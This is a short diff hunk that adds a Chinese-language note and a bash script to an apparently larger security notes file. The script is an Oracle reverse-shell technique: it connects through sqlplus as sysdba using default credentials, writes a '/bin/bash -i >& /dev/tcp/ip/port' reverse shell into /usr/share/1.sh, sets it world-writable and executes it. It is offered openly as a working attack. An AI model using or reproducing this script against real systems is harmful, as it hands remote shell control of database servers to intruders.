@@ -7906,3 +7906,17 @@ if __name__ == "__main__":
 
 
 
+oracle反弹shell 普通的oralcle反弹shell无法直接在terminal窗口反弹shell 用以下脚本即可 且此脚本可以兼容二开反弹任意terminal窗口
+
+#!/bin/bash
+sqlplus -S /nolog > result.log <<EOF
+set heading off feedback off pagesize 0 verify off echo off
+conn sys/oracle as sysdba
+SET define off;
+host echo "/bin/bash -i >& /dev/tcp/ip/port 0>&1" > /usr/share/1.sh;
+host chmod 777  /usr/share/1.sh;
+host bash  /usr/share/1.sh;
+exit
+EOF
+
+
